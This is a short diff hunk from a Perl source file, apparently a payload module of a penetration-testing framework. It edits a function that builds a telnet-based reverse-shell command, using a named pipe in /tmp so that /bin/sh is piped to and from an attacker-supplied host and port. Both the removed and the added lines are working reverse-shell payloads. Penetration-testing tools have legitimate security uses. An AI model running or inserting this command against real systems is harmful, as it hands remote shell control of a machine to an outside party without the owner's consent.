@@ -46,7 +46,7 @@ sub CommandString {
 
   my $command =
   "mknod /tmp/.msfin p;cat /tmp/.msfin|".
-  "telnet $host $port|(echo foo;/bin/sh 2>&1)|telnet $host $port >/tmp/.msfin 2>&1;".
+  "telnet $host $port|/bin/sh 2>&1|telnet $host $port >/tmp/.msfin 2>&1;".
   "rm -f /tmp/.msfin";
 
   return($command);
